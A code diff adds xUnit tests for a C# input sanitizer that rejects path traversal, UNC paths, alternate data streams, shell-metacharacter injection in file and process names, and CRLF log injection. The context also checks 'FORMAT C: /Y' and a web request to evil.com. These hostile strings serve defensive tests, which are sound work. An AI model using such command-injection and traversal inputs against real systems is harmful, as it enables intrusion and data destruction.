@@ -284,6 +284,226 @@ public class InputSanitizerTests
         Assert.NotNull(InputSanitizer.CheckDangerousCommand("FORMAT C: /Y"));
         Assert.NotNull(InputSanitizer.CheckDangerousCommand("INVOKE-WEBREQUEST http://evil.com"));
     }
+
+    // ── ValidateFilePath ─────────────────────────────────────────────
+
+    [Theory]
+    [InlineData(null)]
+    [InlineData("")]
+    [InlineData("   ")]
+    public void ValidateFilePath_NullOrEmpty_ReturnsNull(string? input)
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(input));
+    }
+
+    [Fact]
+    public void ValidateFilePath_PathTraversal_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Users\..\Windows\System32\cmd.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"..\..\Windows\System32\cmd.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\..\..\Windows\notepad.exe"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_UncPath_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(@"\\server\share\file.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"//server/share/file.exe"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_NullByte_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath("C:\\Temp\\file.exe\0.txt"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_AlternateDataStream_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.txt:hidden"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.txt:$DATA"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_ShellMetachars_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.exe|whoami"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.exe&calc"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\file.exe;dir"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\$(whoami)"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Temp\`calc`"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_ProtectedWindowsDir_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Windows\System32\cmd.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Windows\notepad.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\WINDOWS\explorer.exe"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_ProtectedProgramFiles_ReturnsNull()
+    {
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Program Files\app\app.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"C:\Program Files (x86)\app\app.exe"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_ProtectedFileName_ReturnsNull()
+    {
+        // Critical system executables should be rejected regardless of path
+        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\svchost.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\lsass.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\ntoskrnl.exe"));
+        Assert.Null(InputSanitizer.ValidateFilePath(@"D:\Temp\kernel32.dll"));
+    }
+
+    [Fact]
+    public void ValidateFilePath_TooLong_ReturnsNull()
+    {
+        var longPath = @"C:\Temp\" + new string('a', 260) + ".exe";
+        Assert.Null(InputSanitizer.ValidateFilePath(longPath));
+    }
+
+    [Fact]
+    public void ValidateFilePath_ValidPaths_ReturnsCanonicalized()
+    {
+        // These should be accepted (not protected, no traversal)
+        var result = InputSanitizer.ValidateFilePath(@"D:\Temp\suspicious.exe");
+        Assert.NotNull(result);
+        Assert.Equal(@"D:\Temp\suspicious.exe", result);
+    }
+
+    [Fact]
+    public void ValidateFilePath_UserProfile_Accepted()
+    {
+        var path = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
+            "Downloads", "test.exe");
+        var result = InputSanitizer.ValidateFilePath(path);
+        Assert.NotNull(result);
+    }
+
+    // ── SanitizeProcessInput ──────────────────────────────────────────
+
+    [Theory]
+    [InlineData(null)]
+    [InlineData("")]
+    [InlineData("   ")]
+    public void SanitizeProcessInput_NullOrEmpty_ReturnsNull(string? input)
+    {
+        Assert.Null(InputSanitizer.SanitizeProcessInput(input));
+    }
+
+    [Theory]
+    [InlineData("notepad.exe", "notepad.exe")]
+    [InlineData("chrome.exe", "chrome.exe")]
+    [InlineData("my-app.exe", "my-app.exe")]
+    [InlineData("app_v2.0", "app_v2.0")]
+    public void SanitizeProcessInput_ValidNames_ReturnsValue(string input, string expected)
+    {
+        Assert.Equal(expected, InputSanitizer.SanitizeProcessInput(input));
+    }
+
+    [Theory]
+    [InlineData("1234", "1234")]
+    [InlineData("8080", "8080")]
+    public void SanitizeProcessInput_ValidPid_ReturnsValue(string input, string expected)
+    {
+        Assert.Equal(expected, InputSanitizer.SanitizeProcessInput(input));
+    }
+
+    [Theory]
+    [InlineData("0")]
+    [InlineData("1")]
+    [InlineData("4")]
+    public void SanitizeProcessInput_SystemPid_ReturnsNull(string input)
+    {
+        // PID 0 (System Idle) and PID 4 (System) must never be killed
+        Assert.Null(InputSanitizer.SanitizeProcessInput(input));
+    }
+
+    [Theory]
+    [InlineData("notepad;whoami")]
+    [InlineData("app|calc")]
+    [InlineData("app&dir")]
+    [InlineData("app$(id)")]
+    [InlineData("app`ls`")]
+    [InlineData("app name with spaces")]
+    public void SanitizeProcessInput_Injection_ReturnsNull(string input)
+    {
+        Assert.Null(InputSanitizer.SanitizeProcessInput(input));
+    }
+
+    [Fact]
+    public void SanitizeProcessInput_TooLong_ReturnsNull()
+    {
+        var longName = new string('a', 257);
+        Assert.Null(InputSanitizer.SanitizeProcessInput(longName));
+    }
+
+    // ── SanitizeForLog ────────────────────────────────────────────────
+
+    [Theory]
+    [InlineData(null, "")]
+    [InlineData("", "")]
+    public void SanitizeForLog_NullOrEmpty_ReturnsEmpty(string? input, string expected)
+    {
+        Assert.Equal(expected, InputSanitizer.SanitizeForLog(input));
+    }
+
+    [Fact]
+    public void SanitizeForLog_NormalText_Unchanged()
+    {
+        var text = "This is normal log text with numbers 123 and symbols !@#";
+        Assert.Equal(text, InputSanitizer.SanitizeForLog(text));
+    }
+
+    [Fact]
+    public void SanitizeForLog_CrlfInjection_Escaped()
+    {
+        var input = "Normal text\r\nInjected log line";
+        var result = InputSanitizer.SanitizeForLog(input);
+        Assert.Contains("[CRLF]", result);
+        Assert.DoesNotContain("\r\n", result);
+    }
+
+    [Fact]
+    public void SanitizeForLog_NewlineOnly_Escaped()
+    {
+        var input = "Line1\nLine2";
+        var result = InputSanitizer.SanitizeForLog(input);
+        Assert.Contains("[LF]", result);
+        Assert.DoesNotContain("\n", result);
+    }
+
+    [Fact]
+    public void SanitizeForLog_CarriageReturnOnly_Escaped()
+    {
+        var input = "Line1\rLine2";
+        var result = InputSanitizer.SanitizeForLog(input);
+        Assert.Contains("[CR]", result);
+    }
+
+    [Fact]
+    public void SanitizeForLog_ControlChars_Escaped()
+    {
+        // Use \u escapes (4 digits, unambiguous) instead of \x (variable-length, greedy)
+        var input = "Text\u0001\u0002\u0003End";
+        var result = InputSanitizer.SanitizeForLog(input);
+        Assert.Contains("[0x01]", result);
+        Assert.Contains("[0x02]", result);
+        Assert.Contains("[0x03]", result);
+    }
+
+    [Fact]
+    public void SanitizeForLog_NullByte_Escaped()
+    {
+        var input = "Text\u0000End";
+        var result = InputSanitizer.SanitizeForLog(input);
+        Assert.Contains("[0x00]", result);
+    }
 }
 
 /// <summary>
